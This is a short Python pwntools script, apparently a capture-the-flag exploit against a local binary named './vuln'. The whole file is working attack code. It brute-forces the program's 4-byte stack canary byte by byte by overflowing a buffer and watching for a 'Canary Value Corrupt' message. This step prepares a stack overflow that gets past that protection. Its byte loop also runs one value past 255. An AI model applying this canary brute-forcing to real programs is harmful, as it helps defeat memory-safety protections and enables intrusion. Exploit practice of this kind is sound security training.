import binascii
from pwn import *
import sys
import time


BINARY = './vuln'


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def hexPadZero(v):
    return hex(v)[2:].rjust(8, '0')


def start():
    sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)
    return sh


def main():
    canary = ''
    for i in range(4):
        for c in range(0, 256+1):
            sh = start()
            c = chr(c)

            payload = "a"*(0x30-0x10)  # before canary
            payload += canary+c

            sh.sendlineafter('>', str(len(payload)))
            sh.sendlineafter('>', payload)
            data = sh.recvall()
            if 'Canary Value Corrupt' in data:
                pass
            else:
                canary += c
                break

    print(canary)


if __name__ == '__main__':
    main()
